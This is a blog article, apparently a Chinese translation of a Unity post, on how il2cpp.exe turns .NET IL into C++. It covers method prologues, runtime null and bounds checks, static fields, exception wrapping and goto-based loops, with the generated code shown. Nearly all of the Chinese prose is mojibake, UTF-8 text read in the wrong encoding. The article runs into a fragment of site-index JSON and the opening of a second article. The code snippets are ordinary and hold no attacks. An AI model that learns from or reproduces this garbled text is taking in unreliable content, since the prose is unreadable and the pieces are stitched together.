å‰ä¸¤ä¸ªæŒ‡é’ˆæš—ç¤ºç€æ¯ä¸ªå‡½æ•°éƒ½è‡³å°‘æœ‰ä¸¤ä¸ªå‚æ•°ï¼šâ€œthisâ€å’Œâ€œMethodInfo*â€ã€‚è¿™äº›é¢å¤–çš„å‚æ•°ä¼šåŠ é‡æ•´ä¸ªè°ƒç”¨çš„è´Ÿæ‹…ä¹ˆï¼Ÿç†è®ºä¸Šæ˜¯æ˜¾è€Œæ˜“è§ä¼šåŠ é‡çš„ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨å®é™…çš„æµ‹è¯•ä¸­è¿˜æ²¡æœ‰å‘ç°è¿™äº›å‚æ•°å¯¹æ€§èƒ½äº§ç”Ÿå½±å“ã€‚ æˆ‘ä»¬å¯ä»¥ç”¨Ctagså·¥å…·è·³è½¬åˆ°ToStringå‡½æ•°çš„å®šä¹‰éƒ¨åˆ†ï¼Œä½äºBulk_UnityEngine_0.cppæ–‡ä»¶ä¸­ã€‚åœ¨è¿™ä¸ªå‡½æ•°ä¸­çš„ä»£ç çœ‹ä¸Šå»å’ŒC#ä¸­Vector3::ToString()çš„ä»£ç ä¸€ç‚¹ä¹Ÿä¸åƒã€‚ä½†æ˜¯å½“ä½ ç”¨ILSpy è·å–åˆ°Vector3::ToString()å†…éƒ¨çš„ä»£ç åï¼Œä½ ä¼šå‘ç°C++ä»£ç å’ŒC#çš„ILä»£ç æ˜¯ååˆ†æ¥è¿‘çš„ã€‚ ä¸ºä»€ä¹ˆil2cpp.exeä¸é’ˆå¯¹æ¯ä¸€ä¸ªç±»ä¸­çš„å‡½æ•°ç”Ÿæˆå•ç‹¬çš„ä¸€ä¸ªcppæ–‡ä»¶å‘¢ï¼Ÿçœ‹çœ‹Bulk_UnityEngine_0.cppï¼Œä½ ä¼šå‘ç°å®ƒæœ‰æƒŠäººçš„20,481è¡Œï¼ä¹‹æ‰€ä»¥è¿™ä¹ˆåšçš„åŸå› æ˜¯æˆ‘ä»¬å‘ç°C++ç¼–è¯‘å™¨åœ¨å¤„ç†å¤§é‡çš„æ–‡ä»¶æ—¶ä¼šæœ‰é—®é¢˜ã€‚ç¼–è¯‘å››åƒå¤šä¸ª.cppæ–‡ä»¶æ‰€ç”¨çš„æ—¶é—´è¿œæ¯”ç¼–è¯‘ç›¸åŒçš„ä»£ç é‡ï¼Œä½†æ˜¯é›†ä¸­åœ¨80ä¸ª.cppæ–‡ä»¶ä¸­æ‰€ç”¨çš„æ—¶é—´è¦é•¿å¾—å¤šã€‚å› æ­¤il2cpp.exeå°†æ‰€æœ‰ç±»çš„å‡½æ•°å®šä¹‰æ”¾åˆ°ä¸€ä¸ªç»„é‡Œå¹¶ä¸ºè¿™ä¸ªç»„ç”ŸæˆC++æ–‡ä»¶ã€‚ ç°åœ¨è®©æˆ‘ä»¬çœ‹çœ‹å‡½æ•°å£°æ˜å¤´æ–‡ä»¶çš„ç¬¬ä¸€è¡Œï¼š 1#include &quot;codegen/il2cpp-codegen.h&quot; il2cpp-codegen.h æ–‡ä»¶ä¸­åŒ…å«äº†ç”¨æ¥è°ƒç”¨è¿è¡Œæ—¶åº“libil2cppçš„ä»£ç ã€‚æˆ‘ä»¬åœ¨ç¨åä¼šè°ˆè°ˆè°ƒç”¨è¿è¡Œæ—¶åº“çš„ä¸€äº›æ–¹æ³•ã€‚ å‡½æ•°é¢„å¤„ç†ä»£ç æ®µï¼ˆMethod prologues ï¼‰è®©æˆ‘ä»¬å†ä»”ç»†çš„çœ‹ä¸‹Vector3::ToString()å‡½æ•°çš„å®šä¹‰ï¼Œä½ ä¼šå‘ç°å‡½æ•°ä¸­æœ‰ä¸€æ®µç‰¹æœ‰çš„ä»£ç ï¼Œè¿™æ®µä»£ç æ˜¯il2cpp.exeæ¨¡æ¿äº§ç”Ÿçš„ï¼Œä¼šæ’å…¥åˆ°ä»»ä½•å‡½æ•°çš„æœ€å‰é¢ã€‚ 1234567StackTraceSentry _stackTraceSentry(&amp;Vector3_ToString_m2315_MethodInfo);static bool Vector3_ToString_m2315_init;if (!Vector3_ToString_m2315_init){ ObjectU5BU5D_t4_il2cpp_TypeInfo_var = il2cpp_codegen_class_from_type(&amp;ObjectU5BU5D_t4_0_0_0); Vector3_ToString_m2315_init = true;} ä»£ç çš„ç¬¬ä¸€è¡Œæ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡StackTraceSentryã€‚è¿™ä¸ªå˜é‡æ˜¯ç”¨æ¥è·Ÿè¸ªæ‰˜ç®¡ä»£ç çš„å †æ ˆè°ƒç”¨çš„ã€‚æœ‰äº†è¿™ä¸ªå˜é‡ï¼ŒIL2CPPå°±èƒ½åœ¨Environment.StackTraceè°ƒç”¨ä¸­æ­£ç¡®çš„æ‰“å°å‡ºå †æ ˆä¿¡æ¯ã€‚æ˜¯å¦äº§ç”Ÿè¿™è¡Œä»£ç æ˜¯å¯é€‰çš„ï¼Œå½“ä½ åœ¨il2cpp.exeå‘½ä»¤è¡Œä¸­åŠ å…¥â€“enable-stacktraceå¼€å…³ï¼ˆå› ä¸ºæˆ‘åœ¨WebGLé€‰é¡¹ä¸­è®¾ç½®äº†â€œEnable Exceptionsâ€ä¸ºâ€œFullâ€ï¼‰ï¼Œå°±ä¼šç”Ÿæˆè¿™è¡Œä»£ç ã€‚æˆ‘ä»¬å‘ç°å¯¹äºç®€å•çš„å°å‡½æ•°æ¥è¯´ï¼Œè¿™è¡Œä»£ç çš„åŠ å…¥å¯¹ä»£ç çš„æ‰§è¡Œæ€§èƒ½æ˜¯æœ‰å½±å“çš„ã€‚æ‰€ä»¥å¯¹äºiOSæˆ–è€…å…¶ä»–æœ‰å†…ç½®æ ˆä¿¡æ¯çš„å¹³å°æ¥è¯´ï¼Œæˆ‘ä»¬ä¸ä¼šåŠ å…¥è¿™è¡Œä»£ç ï¼ˆè€Œä½¿ç”¨å¹³å°å†…ç½®çš„æ ˆä¿¡æ¯ï¼‰ã€‚ä½†æ˜¯å¯¹äºWebGLæ¥è¯´ï¼Œç”±äºæ˜¯åœ¨æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œæ‰€ä»¥æ²¡æœ‰ç³»ç»Ÿå†…ç½®çš„æ ˆä¿¡æ¯å¯ä¾›è°ƒç”¨ã€‚åªèƒ½ç”±il2cpp.exeåŠ å…¥ä»¥ä¾¿æ‰˜ç®¡ä»£ç çš„å¼‚å¸¸æœºåˆ¶èƒ½æ­£å¸¸è¿ä½œã€‚ ä»£ç åºçš„ç¬¬äºŒéƒ¨åˆ†æ˜¯æ•°ç»„æˆ–è€…å’Œç±»å‹ç›¸å…³çš„å…ƒä¿¡æ¯çš„å»¶è¿ŸåŠ è½½ã€‚ObjectU5BU5D_t4å®é™…ä»£è¡¨çš„æ˜¯System.Object[]ã€‚è¿™éƒ¨åˆ†ä»£ç æ°¸è¿œåªæ‰§è¡Œä¸€æ¬¡ï¼Œå¦‚æœè¿™ä¸ªç±»å‹çš„å…ƒä¿¡æ¯å·²ç»åŠ è½½è¿‡äº†ï¼Œå°±ç›´æ¥è·³è¿‡è¿™æ®µä»£ç ï¼Œå•¥ä¹Ÿä¸åšã€‚æ‰€ä»¥è¿™æ®µä»£ç ä¸ä¼šå¸¦æ¥æ€§èƒ½ä¸‹é™ã€‚ é‚£ä¹ˆè¿™æ®µä»£ç æ˜¯çº¿ç¨‹å®‰å…¨çš„å˜›ï¼Ÿå¦‚æœä¸¤ä¸ªçº¿ç¨‹éƒ½åŒæ—¶è¿›è¡ŒVector3::ToString() è°ƒç”¨ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿå®é™…ä¸Šï¼Œè¿™ä¸ä¼šæœ‰ä»»ä½•é—®é¢˜ï¼Œå› ä¸ºlibil2cppè¿è¡Œæ—¶ä¸­çš„ç±»å‹åˆå§‹åŒ–å‡½æ•°æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚ä¸ç®¡åˆå§‹åŒ–å‡½æ•°è¢«å¤šå°‘ä¸ªçº¿ç¨‹åŒæ—¶è°ƒç”¨ï¼Œå®é™…çš„æ‰§è¡Œæ˜¯åŒä¸€æ—¶é—´åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹çš„å‡½æ•°åœ¨æ‰§è¡Œã€‚å…¶ä»–çº¿ç¨‹çš„å‡½æ•°éƒ½ä¼šè¢«æŒ‚èµ·ç›´åˆ°å½“å‰çš„å‡½æ•°å¤„ç†å®Œæˆã€‚æ‰€ä»¥æ€»çš„æ¥è¯´ï¼Œä»£ç æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚ è¿è¡Œæ—¶æ£€æŸ¥å‡½æ•°çš„ä¸‹ä¸ªéƒ¨åˆ†åˆ›å»ºäº†ä¸€ä¸ªobjectæ•°ç»„ï¼Œå°†Vector3çš„xå­˜åœ¨å±€éƒ¨å˜é‡ä¸­ï¼Œç„¶åå°†è¿™ä¸ªå˜é‡è£…ç®±å¹¶åŠ å…¥åˆ°æ•°ç»„çš„é›¶å·ä½ç½®ä¸­ã€‚ä¸‹é¢æ˜¯ç”Ÿæˆçš„C++ä»£ç ï¼š 12345678910111213// Create a new single-dimension, zero-based object arrayObjectU5BU5D_t4* L_0 = ((ObjectU5BU5D_t4*)SZArrayNew(ObjectU5BU5D_t4_il2cpp_TypeInfo_var, 3));// Store the Vector3::x field in a localfloat L_1 = (__this-&gt;___x_1);float L_2 = L_1;// Box the float instance, since it is a value type.Object_t * L_3 = Box(InitializedTypeInfo(&amp;Single_t264_il2cpp_TypeInfo), &amp;L_2);// Here are three important runtime checksNullCheck(L_0);IL2CPP_ARRAY_BOUNDS_CHECK(L_0, 0);ArrayElementTypeCheck (L_0, L_3);// Store the boxed value in the array at index 0*((Object_t **)(Object_t **)SZArrayLdElema(L_0, 0)) = (Object_t *)L_3; åœ¨ILä»£ç ä¸­æ²¡æœ‰å‡ºç°çš„ä¸‰ä¸ªè¿è¡Œæ—¶æ£€æŸ¥æ˜¯ç”±il2cpp.exeåŠ å…¥çš„ã€‚ å¦‚æœæ•°ç»„ä¸ºç©ºï¼ŒNullCheckä»£ç ä¼šæŠ›å‡ºNullReferenceExceptionå¼‚å¸¸ã€‚ å¦‚æœæ•°ç»„çš„ç´¢å¼•ä¸æ­£ç¡®ï¼ŒIL2CPP_ARRAY_BOUNDS_CHECKä»£ç ä¼šæŠ›å‡ºIndexOutOfRangeExceptionå¼‚å¸¸ã€‚ å¦‚æœåŠ å…¥æ•°ç»„çš„ç±»å‹å’Œæ•°ç»„ç±»å‹ä¸ç¬¦åˆï¼ŒArrayElementTypeCheckä»£ç ä¼šæŠ›å‡ºArrayTypeMismatchExceptionå¼‚å¸¸ã€‚ è¿™ä¸‰ä¸ªæ£€æŸ¥æœ¬æ¥éƒ½æ˜¯ç”±.NETè™šæ‹Ÿæœºå®Œæˆçš„ï¼Œåœ¨Monoå®ç°ä¸­ï¼Œä¸ä¼šæ’å…¥è¿™äº›ä¸ªä»£ç è€Œæ˜¯ä½¿ç”¨å¹³å°ç›¸å…³çš„ä¿¡å·æœºåˆ¶æ¥è¿›è¡Œæ£€æŸ¥ã€‚å¯¹äºIL2CPPï¼Œæˆ‘ä»¬å¸Œæœ›åšåˆ°å’Œå¹³å°æ— å…³çš„å¯ç§»æ¤æ€§å¹¶ä¸”è¿˜è¦æ”¯æŒåƒWebGLè¿™æ ·çš„å¹³å°ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨Monoçš„æœºåˆ¶ï¼Œè€Œæ˜¯æ˜¾ç¤ºçš„æ’å…¥æ£€æŸ¥ä»£ç ã€‚ è¿™äº›æ£€æŸ¥ä¼šå¼•èµ·æ€§èƒ½çš„ä¸‹é™ä¹ˆï¼Ÿåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰çœ‹åˆ°ç”±æ­¤å¸¦æ¥çš„æ€§èƒ½æŸå¤±ï¼Œå¹¶ä¸”å¥½å¤„æ˜¯æˆ‘ä»¬æä¾›äº†.NETè™šæ‹Ÿæœºéœ€è¦çš„å®‰å…¨ä¿æŠ¤æœºåˆ¶ã€‚åœ¨æŸäº›ç‰¹å®šçš„åœºåˆï¼Œæ¯”å¦‚åœ¨å¤§é‡çš„å¾ªç¯ä¸­ï¼Œæˆ‘ä»¬ç¡®å®çœ‹åˆ°äº†æ€§èƒ½çš„ä¸‹é™ã€‚ç›®å‰æˆ‘ä»¬æ­£åœ¨å¯»æ‰¾æ–¹æ³•åœ¨il2cpp.exeç”Ÿæˆä»£ç çš„æ—¶å€™å‡å°‘è¿™äº›è¿è¡Œæ—¶æ£€æŸ¥ï¼Œå„ä½æœ‰å…´è¶£çš„å¯ä»¥ç»§ç»­å…³æ³¨ã€‚ é™æ€å˜é‡æˆ‘ä»¬å·²ç»äº†è§£äº†å®ä¾‹å˜é‡ï¼ˆVector3ï¼‰å¦‚ä½•è¿ä½œï¼Œç°åœ¨è®©æˆ‘ä»¬æ¥çœ‹çœ‹æ‰˜ç®¡ä»£ç ä¸­çš„é™æ€å˜é‡æ˜¯å¦‚ä½•è½¬æ¢æˆC++ä»£ç å¹¶ä½¿ç”¨çš„ã€‚è®©æˆ‘ä»¬æ‰¾åˆ°HelloWorld_Start_m3å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åº”è¯¥åœ¨Bulk_Assembly-CSharp_0.cppæ–‡ä»¶ä¸­ã€‚ä»è¿™ä¸ªå‡½æ•°æˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªå«Important_t1çš„ç±»å‹ï¼ˆè¿™ä¸ªç±»å‹åº”è¯¥æ˜¯åœ¨U2DCSharp_HelloWorld_Important.hå¤´æ–‡ä»¶é‡Œï¼‰ 12345678910struct Important_t1 : public Object_t{// System.Int32 HelloWorld/Important::InstanceIdentifierint32_t ___InstanceIdentifier_1;};struct Important_t1_StaticFields{// System.Int32 HelloWorld/Important::ClassIdentifierint32_t ___ClassIdentifier_0;}; å¤§ä¼™å„¿å¯èƒ½æ³¨æ„åˆ°äº†ï¼Œil2cpp.exeå°†ç”Ÿæˆçš„C++ä»£ç åˆ†æˆäº†ä¸¤ä¸ªç»“æ„ï¼Œä¸€ä¸ªç»“æ„è´Ÿè´£æ™®é€šçš„æˆå‘˜å˜é‡ï¼Œå¦ä¸€ä¸ªç»“æ„è´Ÿè´£é™æ€æˆå‘˜ã€‚å› ä¸ºé™æ€æˆå‘˜æ˜¯æ‰€æœ‰å®ä¾‹å…±äº«çš„æ•°æ®ï¼Œå› æ­¤åœ¨è¿è¡Œçš„æ—¶å€™ï¼ŒImportant_t1_StaticFieldsåªæœ‰ä¸€ä»½ã€‚æ‰€æœ‰çš„Important_t1å®ä¾‹éƒ½å…±äº«è¿™ä¸ªæ•°æ®ã€‚åœ¨ç”Ÿæˆçš„ä»£ç ä¸­ï¼Œé€šè¿‡ä¸‹é¢çš„ä»£ç æ¥è·å–é™æ€æ•°æ®ï¼š 1int32_t L_1 = (((Important_t1_StaticFields*)InitializedTypeInfo(&amp;Important_t1_il2cpp_TypeInfo)-&gt;static_fields)-&gt;___ClassIdentifier_0); åœ¨Important_t1çš„å…ƒä¿¡æ¯ç»“æ„ä¸­æœ‰ä¸€ä¸ªæŒ‡å‘Important_t1_StaticFieldsç»“æ„çš„æŒ‡é’ˆï¼ˆstatic_fieldsï¼‰ï¼Œç„¶åé€šè¿‡ç±»å‹è½¬æ¢å†å–å‡ºéœ€è¦çš„å€¼ï¼ˆ___ClassIdentifier_0ï¼‰ å¼‚å¸¸åœ¨æ‰˜ç®¡ä»£ç ä¸­çš„å¼‚å¸¸ä¼šè¢«il2cpp.exeè½¬æ¢æˆC++çš„å¼‚å¸¸ã€‚æˆ‘ä»¬å†ä¸€æ¬¡çš„é€‰æ‹©äº†è¿™ä¸ªç­–ç•¥è¿˜æ˜¯å‡ºäºå¯ç§»æ¤æ€§çš„è€ƒè™‘ï¼šå»æ‰å’Œå¹³å°ç›¸å…³çš„æ–¹æ¡ˆã€‚å½“il2cpp.exeéœ€è¦è½¬æ¢ç”Ÿæˆä¸€ä¸ªæ‰˜ç®¡çš„å¼‚å¸¸çš„æ—¶å€™ï¼Œå®ƒä¼šè°ƒç”¨il2cpp_codegen_raise_exceptionå‡½æ•°ã€‚ åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œç”Ÿæˆçš„C++å¼‚å¸¸å¤„ç†ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324try{ // begin try (depth: 1) InvalidOperationException_t7 * L_17 = (InvalidOperationException_t7 *)il2cpp_codegen_object_new (InitializedTypeInfo(&amp;InvalidOperationException_t7_il2cpp_TypeInfo)); InvalidOperationException__ctor_m8(L_17, (String_t*) &amp;_stringLiteral5, /*hidden argument*/&amp;InvalidOperationException__ctor_m8_MethodInfo); il2cpp_codegen_raise_exception(L_17); // IL_0092: leave IL_00a8 goto IL_00a8;} // end try (depth: 1)catch(Il2CppExceptionWrapper&amp; e){ __exception_local = (Exception_t8 *)e.ex; if(il2cpp_codegen_class_is_assignable_from (&amp;InvalidOperationException_t7_il2cpp_TypeInfo, e.ex-&gt;object.klass)) goto IL_0097; throw e;}IL_0097:{ // begin catch(System.InvalidOperationException) V_1 = ((InvalidOperationException_t7 *)__exception_local); NullCheck(V_1); String_t* L_18 = (String_t*)VirtFuncInvoker0&lt; String_t* &gt;::Invoke(&amp;Exception_get_Message_m9_MethodInfo, V_1); Debug_Log_m6(NULL /*static, unused*/, L_18, /*hidden argument*/&amp;Debug_Log_m6_MethodInfo); // IL_00a3: leave IL_00a8 goto IL_00a8;} // end catch (depth: 1) æ‰€æœ‰çš„æ‰˜ç®¡å¼‚å¸¸éƒ½è¢«å°è£…è¿›äº†il2CppExceptionWrapperçš„C++ç±»å‹ã€‚å½“C++ä»£ç æ•è·äº†è¿™ç§å¼‚å¸¸ä¹‹åï¼Œä¼šè¯•å›¾å°†åŒ…è§£å¼€è·å¾—æ‰˜ç®¡å¼‚å¸¸ï¼ˆException_t8ï¼‰ã€‚å°±è¿™ä¸ªä¾‹å­è€Œè¨€ï¼Œæˆ‘ä»¬æœŸå¾…çš„æ˜¯ä¸€ä¸ªInvalidOperationExceptionå¼‚å¸¸ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬å‘ç°æŠ›å‡ºçš„å¼‚å¸¸ä¸æ˜¯è¿™ä¸ªç±»å‹çš„æ—¶å€™ï¼Œä»£ç ä¼šåˆ›å»ºä¸€ä¸ªC++å¼‚å¸¸çš„æ‹·è´å¹¶é‡æ–°æŠ›å‡ºã€‚åä¹‹å¦‚æœå¼‚å¸¸æ­£æ˜¯æˆ‘ä»¬æ‰€å…³æ³¨çš„ï¼Œä»£ç å°±ä¼šè·³åˆ°å¼‚å¸¸å¤„ç†çš„é‚£æ®µã€‚ Gotoæ˜¯ä¸ªä»€ä¹ˆé¬¼ï¼Ÿè·³è½¬è¯­å¥ï¼ï¼Ÿï¼è¿™æ®µä»£ç æœ‰ä¸€ä¸ªæœ‰æ„æ€çš„åœ°æ–¹ï¼šå¤§ä¼™å„¿å‘ç°äº†labelsæ ‡ç­¾å’Œgotoè¯­å¥æ²¡æœ‰ï¼Ÿè¿™äº›ä¸å¤ªä½¿ç”¨çš„ä¸œè¥¿å±…ç„¶å‡ºç°åœ¨äº†ç»“æ„åŒ–çš„ä»£ç ä¸­ï¼ˆè¯‘æ³¨ï¼šä¸»æµè§‚ç‚¹éƒ½ä¸å»ºè®®ä½¿ç”¨labelså’Œgotoè¯­å¥ï¼Œå› ä¸ºè¿™ä¼šç ´åç¨‹åºçš„ç»“æ„åŒ–å¯¼è‡´å„ç§bugçš„äº§ç”Ÿï¼‰ã€‚ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿå› ä¸ºILï¼ILæ˜¯æ²¡æœ‰è¯¸å¦‚forï¼Œwhileå¾ªç¯å’Œif/thenåˆ¤æ–­ç»“æ„åŒ–æ¦‚å¿µçš„ä½ç­‰çº§çš„è¯­è¨€ã€‚å› ä¸ºil2cpp.exeéœ€è¦å¤„ç†ILä»£ç ï¼Œå› æ­¤ä¹Ÿä¼šå‡ºç°gotoè¯­å¥ã€‚ è¿˜æ˜¯çœ‹ä¾‹å­ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹HelloWorld_Start_m3å‡½æ•°ä¸­çš„å¾ªç¯æ˜¯ä¸ªå•¥æ ·å­çš„ï¼š 123456789101112131415161718192021222324252627IL_00a8:{ V_2 = 0; goto IL_00cc;}IL_00af:{ ObjectU5BU5D_t4* L_19 = ((ObjectU5BU5D_t4*)SZArrayNew(ObjectU5BU5D_t4_il2cpp_TypeInfo_var, 1)); int32_t L_20 = V_2; Object_t * L_21 = Box(InitializedTypeInfo(&amp;Int32_t5_il2cpp_TypeInfo), &amp;L_20); NullCheck(L_19); IL2CPP_ARRAY_BOUNDS_CHECK(L_19, 0); ArrayElementTypeCheck (L_19, L_21); *((Object_t **)(Object_t **)SZArrayLdElema(L_19, 0)) = (Object_t *)L_21; Debug_LogFormat_m7(NULL /*static, unused*/, (String_t*) &amp;_stringLiteral6, L_19, /*hidden argument*/&amp;Debug_LogFormat_m7_MethodInfo); V_2 = ((int32_t)(V_2+1));}IL_00cc:{ if ((((int32_t)V_2) &lt; ((int32_t)3))) { goto IL_00af; }} åœ¨è¿™é‡Œå˜é‡V_2æ˜¯å¾ªç¯çš„ç´¢å¼•ï¼Œä»0å¼€å§‹ï¼Œåœ¨å¾ªç¯ä»£ç çš„æœ€åè¿›è¡Œç´¯åŠ ã€‚ 1V_2 = ((int32_t)(V_2+1)); å¾ªç¯çš„ç»“æŸæ£€æŸ¥ä»£ç ï¼š 1if ((((int32_t)V_2) &lt; ((int32_t)3))) åªè¦V_2å°äº3ï¼Œgotoè¯­å¥å°±ä¼šè·³è½¬åˆ°IL_00afæ ‡ç­¾å¤„ï¼Œä¹Ÿå°±æ˜¯å¾ªç¯çš„ä¸€å¼€å§‹ç»§ç»­æ‰§è¡Œã€‚ä½ å¯èƒ½ä¼šæƒ³ï¼šå—¯ã€‚ã€‚il2cpp.exeä¸€å®šåœ¨å·æ‡’ï¼Œç›´æ¥ä½¿ç”¨äº†ILçš„ä»£ç è€Œä¸æ˜¯ä½¿ç”¨æŠ½è±¡çš„è¯­æ³•åˆ†ææ ‘ã€‚å¦‚æœä½ æ˜¯è¿™ä¹ˆæƒ³çš„ï¼Œé‚£ä¹ˆæ­å–œä½ çŒœå¯¹äº†ã€‚ã€‚ã€‚ ä½ å¯èƒ½è¿˜ä¼šæ³¨æ„åˆ°åœ¨ä¸Šé¢çš„è¿™æ®µè¿è¡Œæ—¶æ£€æŸ¥çš„ä»£ç ä¸­ï¼Œæœ‰ä¸‹é¢çš„æƒ…å†µï¼š 12float L_1 = (__this-&gt;___x_1);float L_2 = L_1; å¾ˆæ˜¾ç„¶ï¼Œ å˜é‡L_2ä¸æ˜¯å¿…é¡»çš„ï¼Œå¤§å¤šæ•°çš„C++ç¼–è¯‘å™¨ä¼šå°†å…¶ä¼˜åŒ–æ‰ã€‚å¯¹äºæˆ‘ä»¬æ¥è¯´ï¼Œæˆ‘ä»¬åœ¨æƒ³åŠæ³•ä¸å»ç”Ÿæˆè¿™è¡Œä»£ç ï¼ˆè¯‘æ³¨ï¼šå› ä¸ºil2cpp.exeæ˜¯ä»ILè¿›è¡Œä»£ç çš„è½¬æ¢ï¼Œæ²¡æœ‰ä½¿ç”¨é«˜çº§çš„è¯­æ³•åˆ†æï¼Œæ‰€ä»¥ä¼šäº§ç”Ÿå¤šä½™çš„ä»£ç ï¼‰ã€‚æˆ‘ä»¬ä¹Ÿåœ¨ç ”ç©¶ä½¿ç”¨é«˜çº§çš„æŠ½è±¡è¯­æ³•æ ‘ï¼ˆAbstract Syntax Treeï¼Œç¼©å†™ï¼šASTï¼‰ä»¥ä¾¿æ›´å¥½çš„ç†è§£ILä»£ç ä»è€Œäº§ç”Ÿæ›´å¥½çš„C++ä»£ç ï¼ˆè¯‘æ³¨ï¼šå¯èƒ½ä»¥åå°±ä¼šå»é™¤gotoè·³è½¬è¯­å¥äº†ï¼‰ æ€»ç»“æ€»ç»“é€šè¿‡ä¸€ä¸ªç®€å•çš„é¡¹ç›®ï¼Œæˆ‘ä»¬åˆçª¥äº†IL2CPPå¦‚ä½•å°†æ‰˜ç®¡ä»£ç è½¬æ¢æˆC++ä»£ç ã€‚å¦‚æœä½ æ²¡æœ‰ç”Ÿæˆæµ‹è¯•é¡¹ç›®ï¼Œæˆ‘å¼ºçƒˆå»ºè®®ä½ åšä¸€éå¹¶è¿›è¡Œä¸€äº›ç ”ç©¶ã€‚åœ¨ä½ åšè¿™ä»¶äº‹çš„åŒæ—¶ï¼Œè¯·è®°ä½ï¼Œåœ¨åç»­Unityçš„ç‰ˆæœ¬ä¸­ï¼Œç”Ÿæˆçš„C++ä»£ç å¯èƒ½ä¼šå’Œæœ¬æ–‡æœ‰æ‰€ä¸åŒã€‚è¿™æ˜¯æ­£å¸¸çš„ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨ä¸æ–­çš„æ”¹è¿›å’Œä¼˜åŒ–IL2CPPã€‚ é€šè¿‡å°†ILä»£ç è½¬æ¢æˆC++ï¼Œæˆ‘ä»¬èƒ½å¤Ÿè·å¾—åœ¨å¯ç§»æ¤å’Œæ€§èƒ½ä¸Šçš„ä¸€ä¸ªå¾ˆå¥½çš„å¹³è¡¡ã€‚æˆ‘ä»¬èƒ½æ‹¥æœ‰é«˜æ•ˆå¼€å‘çš„æ‰˜ç®¡ä»£ç çš„åŒæ—¶ï¼Œè¿˜èƒ½è·å¾—é«˜è´¨é‡çš„C++ä»£ç ã€‚ åœ¨æ¥ä¸‹æ¥çš„æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å°†æ¢ç´¢æ›´å¤šçš„C++ä»£ç ï¼ŒåŒ…æ‹¬å‡½æ•°è°ƒç”¨ï¼Œå‡½æ•°å¯¹åŸç”Ÿåº“çš„å°è£…å’Œå…±äº«ç­‰ã€‚ä¸‹ç¯‡æ–‡ç« æˆ‘ä»¬å°†ä¼šå›´ç»•iOS 64-bitå’ŒXcodeå±•å¼€ã€‚","link":"/2020/08/26/il2cpp/2%20.%20%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90%E4%B9%8B%E6%97%85/"},{"title":"æ·±å…¥äº†è§£IL2CPP","text":"æ·±å…¥äº†è§£IL2CPPä»€ä¹ˆæ˜¯IL2CPP é¢„å…ˆç¼–è¯‘ï¼ˆAOTï¼‰ An ahead-of-time (AOT) compiler æ”¯æŒè™šæ‹Ÿæœºçš„è¿è¡Œæ—¶åº“ A runtime library to support the virtual machine AOTç¼–è¯‘å™¨å°†ç”± .NET è¾“å‡ºçš„ä¸­é—´è¯­è¨€(IL)ä»£ç ç”Ÿæˆä¸ºC++ä»£ç ã€‚ è¿è¡Œæ—¶åº“æä¾›æœåŠ¡å’ŒæŠ½è±¡ï¼Œä¾‹å¦‚åƒåœ¾æ”¶é›†å™¨ã€å¯¹çº¿ç¨‹å’Œæ–‡ä»¶çš„ç‹¬ç«‹å¹³å°è®¿é—®ä»¥åŠå†…éƒ¨è°ƒç”¨çš„å®ç°ï¼ˆç›´æ¥ä¿®æ”¹æ‰˜ç®¡æ•°æ®ç»“æ„çš„æœ¬æœºä»£ç ï¼‰ã€‚ AOT ç¼–è¯‘å™¨IL2CPP AOT ç¼–è¯‘å™¨å®é™…çš„æ‰§è¡Œæ–‡ä»¶æ˜¯ il2cpp.exe.åœ¨Windowså¹³å°ä½ å¯ä»¥åœ¨Unityå®‰è£…è·¯å¾„çš„ Editor\\Data\\il2cpp ç›®å½•ä¸­æ‰¾åˆ°å®ƒã€‚åœ¨ OSX ä¸Šï¼Œå®ƒä½äº Unityå®‰è£…è·¯å¾„çš„Contents/Frameworks/il2cpp/build ç›®å½•ä¸­ã€‚il2cpp.exe åº”ç”¨ç¨‹åºæ˜¯ä¸€ä¸ªæ‰˜ç®¡çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå®Œå…¨ç”¨ C# ç¼–å†™ã€‚åœ¨ IL2CPP çš„å¼€å‘è¿‡ç¨‹ä¸­ä½¿ç”¨ .NET å’Œ Mono ç¼–è¯‘å™¨å¯¹å…¶è¿›è¡Œç¼–è¯‘ã€‚ il2cpp.exe åº”ç”¨ç¨‹åºæ¥å—ä½¿ç”¨ Unity é™„å¸¦çš„ Mono ç¼–è¯‘å™¨ç¼–è¯‘çš„æ‰˜ç®¡ç¨‹åºé›†ï¼Œå°†è¿™äº›ç¨‹åºé›†è½¬æ¢æˆC++ä»£ç ï¼Œè¿™äº›è½¬æ¢å‡ºçš„C++ä»£ç æœ€ç»ˆç”±éƒ¨ç½²ç›®æ ‡å¹³å°ä¸Šçš„C++ç¼–è¯‘å™¨è¿›è¡Œç¼–è¯‘ã€‚ è¿è¡Œæ—¶åº“IL2CPP æŠ€æœ¯çš„å¦ä¸€éƒ¨åˆ†æ˜¯å¯¹è™šæ‹Ÿæœºæä¾›æ”¯æŒçš„è¿è¡Œæ—¶åº“ã€‚å‡ ä¹å®Œå…¨ä½¿ç”¨ C++ ä»£ç å®ç°äº†è¿™ä¸ªåº“ï¼ˆé‡Œé¢è¿˜æ˜¯æœ‰ä¸€äº›å’Œå¹³å°ç›¸å…³çš„ä»£ç ä½¿ç”¨äº†ç¨‹åºé›†ï¼‰ã€‚è¿è¡Œæ—¶åº“ç§°ä¸º 